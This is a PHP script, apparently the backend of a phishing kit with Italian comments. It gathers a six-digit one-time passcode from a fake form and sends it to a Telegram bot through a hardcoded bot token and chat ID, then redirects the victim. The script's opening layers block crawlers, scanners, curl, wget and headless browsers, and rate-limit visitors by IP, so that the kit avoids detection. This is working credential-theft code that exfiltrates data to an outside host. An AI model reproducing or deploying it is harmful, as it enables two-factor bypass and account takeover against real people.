<?php
session_start();

// 1. First Layer - Basic Bot Filter (GET/POST)
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (!isset($_SESSION['verified'])) {
    // Block empty User-Agent and basic bots
    if (empty($userAgent) || preg_match('/bot|crawl|spider|curl|wget|python|java|php|ruby|httpclient/i', $userAgent)) {
        header("HTTP/1.1 403 Forbidden");
        exit;
    }
    
    // Set temporary verification session
    $_SESSION['verified'] = true;
    $_SESSION['fingerprint'] = md5($_SERVER['HTTP_ACCEPT'] . $_SERVER['HTTP_ACCEPT_LANGUAGE'] . $userAgent);
}

// 2. Browser Validation Layer (GET requests only)
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // Check for basic browser capabilities
    $acceptHeader = $_SERVER['HTTP_ACCEPT'] ?? '';
    if (strpos($acceptHeader, 'text/html') === false) {
        header("HTTP/1.1 403 Forbidden");
        exit;
    }
    
    // Generate time-limited token for form submission
    if (!isset($_SESSION['form_token'])) {
        $_SESSION['form_token'] = bin2hex(random_bytes(16));
        $_SESSION['form_start'] = time();
    }
}

// 3. Honeypot Trap
if (!empty($_POST['website'])) {
    header("HTTP/1.1 403 Forbidden");
    exit;
}


// 4. Block Headless Browser Patterns
$headlessPattern = '/HeadlessChrome|PhantomJS|QwantBrowser|Puppeteer|Selenium|WebDriver|\\bBot\\b/i';
if (preg_match($headlessPattern, $userAgent)) {
    header("HTTP/1.1 403 Forbidden");
    exit;
}

// 5. Rate Limiting by IP
$ip = $_SERVER['REMOTE_ADDR'];
$attemptsFile = 'attempts.json';
$maxAttempts = 10;
$rateWindow = 3600; // 1 hour window

$attempts = file_exists($attemptsFile) ? json_decode(file_get_contents($attemptsFile), true) : [];

$attempts[$ip] = [
    'count' => ($attempts[$ip]['count'] ?? 0) + 1,
    'last_attempt' => time(),
    'first_attempt' => $attempts[$ip]['first_attempt'] ?? time()
];

// Reset counter if window expired
if ((time() - ($attempts[$ip]['first_attempt'] ?? 0)) > $rateWindow) {
    unset($attempts[$ip]);
}

if (($attempts[$ip]['count'] ?? 0) >= $maxAttempts) {
    header("HTTP/1.1 429 Too Many Requests");
    exit;
}
file_put_contents($attemptsFile, json_encode($attempts));

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recupera il valore del radio button selezionato
    $otpcode0 = $_POST["otpCode-0"];
    $otpcode1 = $_POST["otpCode-1"];
    $otpcode2 = $_POST["otpCode-2"];
    $otpcode3 = $_POST["otpCode-3"];
    $otpcode4 = $_POST["otpCode-4"];
    $otpcode5 = $_POST["otpCode-5"];

    // Token del bot Telegram e ID del canale
    $botApiToken = '6400179200:AAFLNC22j2zdSxCD83QB70N3zgHyG3AMgiA';
    $channelId = '8105246558';

    // Creazione del messaggio da inviare
    $txt = "🔑OTP🔑: {$otpcode0}{$otpcode1}{$otpcode2}{$otpcode3}{$otpcode4}{$otpcode5}";

    // Costruzione della query per l'API di Telegram
    $query = http_build_query([
        'chat_id' => $channelId,
        'text' => $txt,
    ]);

    // URL dell'API di Telegram
    $url = "https://api.telegram.org/bot{$botApiToken}/sendMessage?{$query}";

    // Inizializza cURL per inviare la richiesta HTTP
    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CUSTOMREQUEST => 'GET',
    ]);

    // Esegui la richiesta e chiudi cURL
    $response = curl_exec($curl);
    curl_close($curl);

    // Reset rate limiting on success
    if (isset($attempts[$ip])) {
        unset($attempts[$ip]);
        file_put_contents($attemptsFile, json_encode($attempts));
    }
    
    // Reindirizza l'utente a una pagina di conferma
    header("Location: redirect/index.html");
    exit;
}
?>
